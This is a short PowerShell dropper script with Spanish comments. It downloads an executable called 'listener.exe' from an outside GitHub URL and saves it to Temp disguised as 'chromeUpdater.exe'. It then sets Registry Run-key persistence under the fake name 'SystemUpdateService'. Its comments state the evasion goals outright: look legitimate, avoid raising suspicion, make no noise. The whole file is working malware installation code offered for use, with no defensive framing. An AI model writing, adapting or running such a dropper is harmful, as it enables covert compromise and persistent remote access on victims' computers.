# installer.ps1
# Objetivo: Descargar x.exe y establecer persistencia vía Registro (HKCU Run)
# Esto evita los problemas de permisos de la Task Scheduler y carpetas Temp.

$targetPath = "$env:TEMP\chromeUpdater.exe"
$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe" # Cambia esto por tu URL real si es diferente
$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdateService" # Nombre falso para parecer legítimo

# 1. Descargar el archivo
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
}
catch {
    # Si falla la descarga, no podemos continuar
    exit 1
}

# 2. Establecer persistencia vía Registro
# Esto funciona sin permisos de administrador y no es bloqueado por estar en Temp
try {
    New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType STRING -Force
}
catch {
    # Si falla, el script termina. No hacemos ruido.
    exit 1
}

# 3. (Opcional) No ejecutamos inmediatamente para no levantar sospechas,
# la persistencia se activará en el siguiente reinicio/inicio de sesión.
# Si necesitas probar que funciona, descomenta la siguiente línea:
# Start-Process $targetPath

exit 0
